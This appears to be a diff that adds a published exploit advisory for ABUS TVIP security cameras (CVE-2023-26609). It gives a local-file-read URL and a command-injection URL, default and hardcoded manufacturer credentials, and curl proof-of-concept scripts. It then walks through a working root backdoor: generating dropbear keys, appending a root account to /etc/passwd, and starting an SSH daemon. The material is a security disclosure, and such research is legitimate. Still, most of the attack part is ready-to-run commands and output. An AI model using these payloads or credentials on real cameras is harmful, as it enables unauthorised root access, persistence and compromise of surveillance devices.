@@ -1,0 +1,163 @@
+id: 38224
+date: 02/27/2023
+title: ABUS Security Camera TVIP 20000-21150 LFI / Remote Code Execution Vulnerability
+author: d1g
+cves: CVE-2023-26609
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+# Exploit Title:  ABUS Security Camera LFI, RCE and SSH Root Access
+# Date:      2023-02-16
+# Exploit Author:  d1g@segfault.net for NetworkSEC [NWSSA-001-2023]
+# Vendor Homepage:  https://www.abus.com
+# Version/Model:  TVIP 20000-21150 (probably many others)
+# Tested on:    GM ARM Linux 2.6, Server: Boa/0.94.14rc21
+# CVE:      CVE-2023-26609
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+
+++++++++++++++++++++
+0x00  DESCRIPTION
+++++++++++++++++++++
+
+During a recent engagement, a network camera was discovered. Web fuzzing 
+revealed a URL of
+
+/device
+
+containing output about running processes as well as a pretty complete 
+listing of webcontent which inevitably arose our suspicion.
+
+More research revealed that files w/ known LFI and RCE issues were present, 
+leading to either arbitrary file reads or remote code execution, both w/ 
+root privileges and using known default credentials (either admin:admin 
+or manufacture:erutcafunam).
+
+After closer filesystem inspection, RCE led to a remote root SSH shell.
+
+
++++++++++++++++
+0x01  IMPACT
++++++++++++++++
+
+The LFI vulnerability can be exploited using a URL of:
+
+/cgi-bin/admin/fileread?READ.filePath=[filename]
+
+and is able to read any file on the system.
+
+
+The RCE vulnerability originates from a command injection and may be 
+exploited by calling a URL of:
+
+/cgi-bin/mft/wireless_mft?ap=irrelevant;[command]
+
+(as classy as it can get, we can also use the pipe "|" instead, and
+linefeed a.k.a. "%0a" works as well)
+
+effectively giving us remote code (or rather command) execution.
+
+
++++++++++++++++++++++++++++++++
+0x02   PROOF OF CONCEPT (PoC)
++++++++++++++++++++++++++++++++
+
+#!/bin/bash
+#
+# ABUS Security Camera LFI
+#
+curl -iv "http://admin:admin@a.b.c.d/cgi-bin/admin/fileread?READ.filePath=/$1"
+
+The script can be called like:
+
+./LFI.sh /etc/passwd
+
+to display the contents of the passwd file. When reading the configuration of
+the BOA server (/etc/boa.conf), we find hardcoded credentials:
+
+# MFT: Specify manufacture commands user name and password
+MFT manufacture erutcafunam 
+
+These can now be used to execute the RCE (based on command injection):
+
+#!/bin/bash
+#
+# ABUS Security Camera RCE
+#
+curl -iv "http://manufacture:erutcafunam@a.b.c.d/cgi-bin/mft/wireless_mft?ap=testname;$1"
+
+and can be called like:
+
+./LFI.sh id
+
+to display a user id of 
+
+uid=0(root) gid=0(root)
+
+
++++++++++++++++++++++++++++++++
+0x03  SSH Remote Root Access
++++++++++++++++++++++++++++++++
+
+After having discovered the previously described vulnerabilities, multiple 
+attempts to spawn a nice reverse shell failed as the system was minimal 
+and did neither offer binaries like bash or netcat, nor any compilers or 
+scripting language interpreters to execute our code. Furthermore, binaries 
+that we transferred onto the system (for ARM little-endian architecture) 
+either resulted in "Segmentation fault" (mfsvenom) or as we saw later
+"Illegal instruction" (netcat for ARM).
+
+We had to inspect the local attack surface and use the LOLBIN approach,
+a.k.a. living off the land binaries available on the system. 
+
+In this case, the minimal and often busybox-included dropbear SSH daemon 
+became pretty handy. 
+
+
+To successfully implement a remote root SSH shell for persistance, several 
+steps had to be undertaken:
+
+
+1) First, we had to create a valid SSH keyset by reusing our RCE.sh skript:
+
+./RCE.sh "/etc/dropbear/dropbearkey%20-t%20rsa%20-f%20/etc/dropbear/dropbear_rsa_host_key"
+
+
+2) Then, add our user to the password file, e.g.:
+
+./RCE.sh "echo%20d1g:OmE2EUpLJafIk:0:0:root:/:/bin/sh%20>>%20/etc/passwd"
+
+
+3) Finally, start the server:
+
+./RCE.sh "/etc/dropbear/dropbear%20-E%20-F"
+
+
+We can now SSH (using obsolete and insecure algorithms for both KeyExchange and HostKey) 
+into our rootshell:
+
+sshpass -p XXXXXXX ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa d1g@x.x.x.x
+
+Welcome to
+
+    _____    __      ___       __     ___       _     _    _
+   |  ___|  /  \    / __ \    /  \   |  _ \    /  \   \ \ / /
+   | |___  / /\ \  | /__\ \  / /\ \  | | \ |  / /\ \   \ V /
+   |  ___|| |__| | |  _   / | |__| | | | | | | |__| |   \ /
+   | |    |  __  | | |  \ \ |  __  | | |_/ / |  __  |   | |
+   |_|    |_|  |_| |_|   \_\|_|  |_| |___ /  |_|  |_|   |_|
+
+For further information check:
+http://www.GM.com/
+
+BusyBox v1.1.3 (2012.07.16-03:58+0000) Built-in shell (ash)
+Enter 'help' for a list of built-in commands.
+
+[d1g]# id
+uid=0(root) gid=0(root)
+
+
+---
+
+#EOF
+
+#  0day.today [2023-03-27]  #
